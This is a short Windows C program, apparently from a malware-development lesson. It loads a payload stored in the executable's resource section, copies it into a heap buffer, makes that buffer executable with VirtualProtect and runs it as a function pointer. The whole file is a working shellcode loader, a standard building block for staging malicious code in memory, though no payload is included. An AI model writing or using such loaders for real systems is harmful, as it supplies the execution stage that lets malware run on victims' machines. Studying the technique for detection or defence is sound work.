#include <Windows.h>
#include <stdio.h>
#include "../resource.h"

int main() {

	HRSRC		hRsrc = NULL;
	HGLOBAL		hGlobal = NULL;
	PVOID		pPayloadAddress = NULL;
	SIZE_T		sPayloadSize = NULL;


	// Get the location to the data stored in .rsrc by its id. It's in resource.h file and linked to the executable by Resource.rc file.
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		// error handling
		printf("FindResourceW Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		// error handling 
		printf("LoadResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the address of our payload in .rsrc section
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		// error handling
		printf("LockResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the size of our payload in .rsrc section
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL) {
		// error handling
		printf("SizeofResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Printing pointer and size to the screen
	printf("pPayloadAddress var : 0x%p \n", pPayloadAddress);
	printf("sPayloadSize var : %ld \n", sPayloadSize);


	// Allocating memory using HeapAlloc
	PVOID pTmpBuffer = HeapAlloc(GetProcessHeap(), 0, sPayloadSize);
	if (pTmpBuffer != NULL) {
		// copying the payload from resource section to the new buffer 
		memcpy(pTmpBuffer, pPayloadAddress, sPayloadSize);
	}

	// Printing the base address of our buffer (pTmpBuffer)
	printf("pTmpBuffer var : 0x%p \n", pTmpBuffer);


	// just in case
	//BOOL VirtualProtect(
	//[in]  LPVOID lpAddress,
	//	[in]  SIZE_T dwSize,
	//	[in]  DWORD  flNewProtect,
	//	[out] PDWORD lpflOldProtect
	//	);


	// we need to declare dwOldProtection in order to change the protection of our buffer
	DWORD dwOldProtection = 0;

	VirtualProtect(pTmpBuffer, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection);

	// we can execute our payload by calling it as a function pointer
	((void(*)())pTmpBuffer)();


	return 0;
}
